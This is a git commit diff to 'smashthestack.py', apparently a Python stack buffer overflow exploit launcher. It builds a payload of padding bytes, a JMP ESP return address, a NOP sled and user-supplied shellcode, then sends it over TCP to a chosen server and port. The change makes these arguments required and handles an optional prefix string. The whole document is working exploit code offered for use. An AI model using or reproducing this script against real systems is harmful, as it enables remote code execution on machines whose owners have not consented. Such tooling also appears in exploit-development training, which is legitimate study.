d3397f1185f3c9d7029b1ce9a15dcfa8004d48ed
3Xploitd <40121116+3Xploitd@users.noreply.github.com>
2022-06-11 04:12:50 -0500

    Update smashthestack.py

--- smashthestack.py
+++ smashthestack.py
@@ -6,10 +6,10 @@ parser = argparse.ArgumentParser(prog='PyFuzzer', usage='%(prog)s -s/--server <D
 parser.add_argument('--server','-s',type=str,help='The host you want to connect with', action='store', required=True)
 parser.add_argument('--port','-p',type=int,help='The port you want to connect to',action='store', required=True)
 parser.add_argument('--data','-d',type=str,help='The payload that needs to prepend the buffer', action='store', default='', required=False)
-parser.add_argument('--buffer', '-b', type=int,help='The size of the buffer', action='store', default=100, required=False)
-parser.add_argument('--memaddr', '-m', type=str,help='Memory address for "JMP ESP"', action='store', required=False)
-parser.add_argument('--nops', '-n', type=int, help='number of NOPS to use for padding, default is 32', default=32, required=False)
-parser.add_argument('--overflow','-o',type=str, help='The exploit code to jump into', required=False)
+parser.add_argument('--buffer', '-b', type=int,help='The size of the buffer', action='store', default=100, required=True)
+parser.add_argument('--memaddr', '-m', type=str,help='Memory address for "JMP ESP"', action='store', required=True)
+parser.add_argument('--nops', '-n', type=int, help='number of NOPS to use for padding, default is 32', default=32, required=True)
+parser.add_argument('--overflow','-o',type=str, help='The exploit code to jump into', required=True)
 
 args = parser.parse_args()
 file = open(args.overflow,'r').read()[23:-2].replace('"','').replace('\n','').replace('x','0x').split('\\')
@@ -21,9 +21,11 @@ for each in file:
     
 
 shellcode = (b'\x41' * args.buffer) + (struct.pack('<L',int(args.memaddr,16))) + (b'\x90' * args.nops) + (overflow)
-data = bytes(args.data,'latin-1')
-payload = data + shellcode
-
+if args.data != '':
+    data = bytes(args.data,'latin-1')
+    payload = data + shellcode
+else:
+    payload = shellcode
 try:
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((args.server, args.port))
